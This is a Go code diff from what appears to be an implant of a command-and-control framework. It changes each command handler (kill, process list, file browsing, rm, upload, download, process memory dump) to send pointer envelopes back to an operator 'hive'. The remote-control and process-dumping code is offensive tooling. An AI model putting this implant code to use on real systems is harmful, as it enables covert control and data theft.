@@ -20,14 +20,14 @@ import (
 )
 
 // ---------------- Cross-platform Handlers ----------------
-func killHandler(send chan pb.Envelope, data []byte) {
+func killHandler(send chan *pb.Envelope, data []byte) {
 	// {{if .Debug}}
 	log.Printf("Received kill command\n")
 	// {{end}}
 	os.Exit(0)
 }
 
-func pingHandler(send chan pb.Envelope, data []byte) {
+func pingHandler(send chan *pb.Envelope, data []byte) {
 	ping := &pb.Ping{}
 	err := proto.Unmarshal(data, ping)
 	if err != nil {
@@ -40,7 +40,7 @@ func pingHandler(send chan pb.Envelope, data []byte) {
 	log.Printf("ping id = %s", ping.Id)
 	// {{end}}
 	data, _ = proto.Marshal(ping)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   ping.Id,
 		Type: "ping",
 		Data: data,
@@ -48,7 +48,7 @@ func pingHandler(send chan pb.Envelope, data []byte) {
 	send <- envelope
 }
 
-func psHandler(send chan pb.Envelope, data []byte) {
+func psHandler(send chan *pb.Envelope, data []byte) {
 	psListReq := &pb.ProcessListReq{}
 	err := proto.Unmarshal(data, psListReq)
 	if err != nil {
@@ -77,7 +77,7 @@ func psHandler(send chan pb.Envelope, data []byte) {
 		})
 	}
 	data, _ = proto.Marshal(psList)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   psListReq.Id,
 		Type: pb.MsgPsList,
 		Data: data,
@@ -85,7 +85,7 @@ func psHandler(send chan pb.Envelope, data []byte) {
 	send <- envelope
 }
 
-func dirListHandler(send chan pb.Envelope, data []byte) {
+func dirListHandler(send chan *pb.Envelope, data []byte) {
 	dirListReq := &pb.DirListReq{}
 	err := proto.Unmarshal(data, dirListReq)
 	if err != nil {
@@ -114,7 +114,7 @@ func dirListHandler(send chan pb.Envelope, data []byte) {
 
 	// Send back the response
 	data, _ = proto.Marshal(dirList)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   dirListReq.Id,
 		Type: pb.MsgDirList,
 		Data: data,
@@ -131,7 +131,7 @@ func getDirList(target string) (string, []os.FileInfo, error) {
 	return dir, []os.FileInfo{}, errors.New("Directory does not exist")
 }
 
-func rmHandler(send chan pb.Envelope, data []byte) {
+func rmHandler(send chan *pb.Envelope, data []byte) {
 	rmReq := &pb.RmReq{}
 	err := proto.Unmarshal(data, rmReq)
 	if err != nil {
@@ -159,7 +159,7 @@ func rmHandler(send chan pb.Envelope, data []byte) {
 	}
 
 	data, _ = proto.Marshal(rm)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   rmReq.Id,
 		Type: pb.MsgRm,
 		Data: data,
@@ -167,7 +167,7 @@ func rmHandler(send chan pb.Envelope, data []byte) {
 	send <- envelope
 }
 
-func mkdirHandler(send chan pb.Envelope, data []byte) {
+func mkdirHandler(send chan *pb.Envelope, data []byte) {
 	mkdirReq := &pb.MkdirReq{}
 	err := proto.Unmarshal(data, mkdirReq)
 	if err != nil {
@@ -190,7 +190,7 @@ func mkdirHandler(send chan pb.Envelope, data []byte) {
 	}
 
 	data, _ = proto.Marshal(mkdir)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   mkdirReq.Id,
 		Type: pb.MsgRm,
 		Data: data,
@@ -199,7 +199,7 @@ func mkdirHandler(send chan pb.Envelope, data []byte) {
 
 }
 
-func cdHandler(send chan pb.Envelope, data []byte) {
+func cdHandler(send chan *pb.Envelope, data []byte) {
 	cdReq := &pb.CdReq{}
 	err := proto.Unmarshal(data, cdReq)
 	if err != nil {
@@ -217,7 +217,7 @@ func cdHandler(send chan pb.Envelope, data []byte) {
 	}
 
 	data, _ = proto.Marshal(pwd)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   cdReq.Id,
 		Type: pb.MsgPwd,
 		Data: data,
@@ -225,7 +225,7 @@ func cdHandler(send chan pb.Envelope, data []byte) {
 	send <- envelope
 }
 
-func pwdHandler(send chan pb.Envelope, data []byte) {
+func pwdHandler(send chan *pb.Envelope, data []byte) {
 	pwdReq := &pb.PwdReq{}
 	err := proto.Unmarshal(data, pwdReq)
 	if err != nil {
@@ -242,7 +242,7 @@ func pwdHandler(send chan pb.Envelope, data []byte) {
 	}
 
 	data, _ = proto.Marshal(pwd)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   pwdReq.Id,
 		Type: pb.MsgPwd,
 		Data: data,
@@ -251,7 +251,7 @@ func pwdHandler(send chan pb.Envelope, data []byte) {
 }
 
 // Send a file back to the hive
-func downloadHandler(send chan pb.Envelope, data []byte) {
+func downloadHandler(send chan *pb.Envelope, data []byte) {
 	downloadReq := &pb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
@@ -278,7 +278,7 @@ func downloadHandler(send chan pb.Envelope, data []byte) {
 	}
 
 	data, _ = proto.Marshal(download)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   downloadReq.Id,
 		Type: pb.MsgDownload,
 		Data: data,
@@ -286,7 +286,7 @@ func downloadHandler(send chan pb.Envelope, data []byte) {
 	send <- envelope
 }
 
-func uploadHandler(send chan pb.Envelope, data []byte) {
+func uploadHandler(send chan *pb.Envelope, data []byte) {
 	uploadReq := &pb.UploadReq{}
 	err := proto.Unmarshal(data, uploadReq)
 	if err != nil {
@@ -314,7 +314,7 @@ func uploadHandler(send chan pb.Envelope, data []byte) {
 	}
 
 	data, _ = proto.Marshal(upload)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   uploadReq.Id,
 		Type: pb.MsgUpload,
 		Data: data,
@@ -323,7 +323,7 @@ func uploadHandler(send chan pb.Envelope, data []byte) {
 
 }
 
-func dumpHandler(send chan pb.Envelope, data []byte) {
+func dumpHandler(send chan *pb.Envelope, data []byte) {
 	procDumpReq := &pb.ProcessDumpReq{}
 	err := proto.Unmarshal(data, procDumpReq)
 	if err != nil {
@@ -340,7 +340,7 @@ func dumpHandler(send chan pb.Envelope, data []byte) {
 		dumpResp.Err = fmt.Sprintf("%v", err)
 	}
 	data, _ = proto.Marshal(dumpResp)
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Id:   procDumpReq.Id,
 		Type: pb.MsgProcessDump,
 		Data: data,
